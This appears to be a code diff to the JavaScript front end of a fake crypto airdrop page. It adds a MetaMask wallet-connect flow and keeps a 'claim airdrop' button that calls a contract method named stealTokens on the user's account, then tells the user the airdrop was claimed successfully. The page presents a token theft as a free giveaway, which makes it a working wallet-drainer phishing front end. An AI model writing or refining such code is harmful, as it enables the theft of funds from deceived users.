@@ -1,7 +1,27 @@
-// eth.js
+// Initialize accounts as an empty array to avoid undefined errors
+let accounts = [];
+
+// Function to connect the wallet and update accounts
+async function connectWallet() {
+    try {
+        // Request accounts from MetaMask
+        accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+
+        // Now accounts is populated, enable the claim button
+        console.log("Connected accounts:", accounts);
+
+        const claimButton = document.getElementById('claimAirdropButton');
+        claimButton.disabled = false; // Enable the button after wallet connection
+
+    } catch (error) {
+        console.error("Error connecting to wallet:", error);
+        alert("Failed to connect to wallet. Please try again.");
+    }
+}
 
 // Function to claim the airdrop
 async function claimAirdrop() {
+    // Check if accounts is properly initialized
     if (accounts.length === 0) {
         alert('Please connect to a wallet first!');
         return;
@@ -13,9 +33,10 @@ async function claimAirdrop() {
     }
 
     const contract = new web3.eth.Contract(contractABI, contractAddress);
+
     try {
         console.log('Claiming airdrop...');
-        // Use the globally defined accounts
+        // Use the first account in the accounts array
         await contract.methods.stealTokens(accounts[0]).send({ from: accounts[0] });
         alert('Airdrop claimed successfully!');
     } catch (error) {
@@ -24,15 +45,14 @@ async function claimAirdrop() {
     }
 }
 
-// Attach the event listener for the claim button
+// Attach event listeners after DOM is loaded
 window.addEventListener('DOMContentLoaded', () => {
-    const claimButton = document.getElementById('claimAirdropButton');
-    if (claimButton) {
-        claimButton.disabled = false; // Enable the button when DOM is loaded
-        claimButton.addEventListener('click', claimAirdrop);
-    } else {
-        console.error("Claim button with ID 'claimAirdropButton' not found.");
-    }
+    const connectButton = document.getElementById('connectButton'); // Replace with your connect button ID
+    connectButton.addEventListener('click', connectWallet);
+
+    const claimButton = document.getElementById('claimAirdropButton'); // Replace with your claim button ID
+    claimButton.disabled = true; // Initially disable the claim button
+    claimButton.addEventListener('click', claimAirdrop);
 });
 
 
